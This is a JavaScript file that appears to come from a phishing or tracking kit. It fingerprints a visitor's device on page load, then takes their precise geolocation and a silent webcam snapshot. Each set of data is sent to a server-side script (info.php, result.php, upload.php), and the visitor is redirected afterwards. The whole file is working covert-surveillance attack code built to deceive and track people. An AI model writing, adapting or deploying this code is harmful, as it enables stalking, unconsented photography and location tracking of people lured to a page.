// 1. Device Info (Runs on Page Load)
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;

  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven = 'Not Available';
  var ren = 'Not Available';

  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  } catch (e) {}
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (debugInfo) {
      ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
  }

  // Browser Detection
  var brw;
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  } else {
    brw = 'Not Available';
  }

  var ht = window.screen.height;
  var wd = window.screen.width;

  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) os = 'Not Available';
  os = os.trim();

  // Sends to info.php
  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// 2. Location Logic (Runs on Click)
function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(
      function(position) { showPosition(position, callback); }, 
      function(error) { showError(error, errCallback); }, 
      optn
    );
  } else {
    errCallback();
  }
}

function showError(error, errCallback) {
  var err_text;
  var err_status = 'failed';

  switch (error.code) {
    case error.PERMISSION_DENIED: err_text = 'User denied Geolocation'; break;
    case error.POSITION_UNAVAILABLE: err_text = 'Location unavailable'; break;
    case error.TIMEOUT: err_text = 'Location timed out'; break;
    case error.UNKNOWN_ERROR: err_text = 'Unknown error'; break;
  }

  // Sends to error.php
  $.ajax({
    type: 'POST',
    url: error_file,
    data: { Status: err_status, Error: err_text },
    success: function() { if(errCallback) errCallback(); },
    mimeType: 'text'
  });
}

function showPosition(position, callback) {
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  var acc = position.coords.accuracy;
  var alt = position.coords.altitude || 0;
  var dir = position.coords.heading || 0;
  var spd = position.coords.speed || 0;

  // Sends to result.php
  $.ajax({
    type: 'POST',
    url: result_file,
    data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
    success: function() { 
        // Location Successful! Now run the next step (Camera)
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}

// 3. Camera Logic (Runs after Location Success)
function captureAndSend(callback) {
  var video = document.createElement('video');
  var canvas = document.getElementById('canvas');

  // Video settings to be silent and fast
  video.autoplay = true;
  video.muted = true;
  video.playsInline = true;

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
      video.srcObject = stream;
      video.play();

      // Wait 1 second for focus/light
      setTimeout(function() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(function(blob) {
          var formData = new FormData();
          formData.append('image', blob, 'cam.jpg');

          // Sends to upload.php
          $.ajax({
            url: upload_file,   
            type: 'POST',
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
              stream.getTracks().forEach(track => track.stop());
              if (callback) callback(); // Redirect
            },
            error: function() {
              if (callback) callback(); // Redirect anyway
            }
          });
        }, 'image/jpeg', 0.8);
      }, 1000);
    }).catch(function(err) {
      if (callback) callback();
    });
  } else {
    if (callback) callback();
  }
}
